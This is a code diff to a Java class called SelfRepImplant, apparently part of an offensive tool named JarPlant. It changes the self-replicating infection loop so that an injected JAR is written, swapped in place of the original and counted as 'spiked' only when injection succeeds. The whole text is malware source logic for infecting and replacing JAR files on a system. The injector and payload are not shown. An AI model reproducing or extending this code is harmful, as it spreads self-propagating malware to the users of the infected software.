@@ -127,12 +127,16 @@ public class SelfRepImplant implements Runnable, Thread.UncaughtExceptionHandler
             try {
                 Path outputTempFile = getTempFilePathFor(jarToImplant);
                 JarFiddler jar = JarFiddler.buffer(jarToImplant);
-                injector.injectInto(jar);
-                jar.write(outputTempFile);
-                System.out.println("[+] JarPlant '" + jarToImplant.getFileName() + "' -> '" + outputTempFile.getFileName() + "'.");
-                doTheSwitcharoo(jarToImplant, outputTempFile);
-                numInfected++;
-                System.out.println("[+] Spiked JAR '" + jarToImplant + "'.");
+                boolean didInfect = injector.injectInto(jar);
+                if (didInfect) {
+                    jar.write(outputTempFile);
+                    System.out.println("[+] JarPlant '" + jarToImplant.getFileName() + "' -> '" + outputTempFile.getFileName() + "'.");
+                    doTheSwitcharoo(jarToImplant, outputTempFile);
+                    numInfected++;
+                    System.out.println("[+] Spiked JAR '" + jarToImplant + "'.");
+                } else {
+                    System.out.println("[!] JarPlant chose to _not_ infect '" + jarToImplant + "'.");
+                }
             } catch (IOException e) {
                 System.out.println("[-] Failed to spike JAR '" + jarToImplant + "' (" + e.getMessage() + ")");
                 //e.printStackTrace();
